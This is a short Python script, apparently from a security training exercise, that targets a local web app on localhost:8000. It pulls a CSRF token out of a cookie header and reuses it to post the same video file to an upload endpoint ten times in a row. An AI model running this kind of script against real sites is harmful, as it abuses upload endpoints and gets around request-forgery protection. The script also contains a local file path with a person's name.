import requests

host = 'http://localhost:8000'


def hack_the_site():
    data = requests.get(
        f'{host}/admin/?next=/admin/'
    )
    csrf_token = data.headers.get('Set-Cookie').split(';')[0].split('=')[1]
    print(f"Получили token: {csrf_token}")

    fp = open('C:\\Users\\Виталий Пеунов\\Downloads\\Nirvana.mp4', 'rb')
    files = {'file': fp}

    for i in range(10):
        print(f"Добавили {i} раз")
        requests.post(
            f'{host}/case2_2/post/',
            data={
                'csrfmiddlewaretoken': csrf_token,
                'text': f'Random text {i}'
            },
            headers={
                'X-CSRFToken': csrf_token,
                'Cookie': f'csrftoken={csrf_token}'
            },
            files=files
        )
    fp.close()


if __name__ == '__main__':
    hack_the_site()
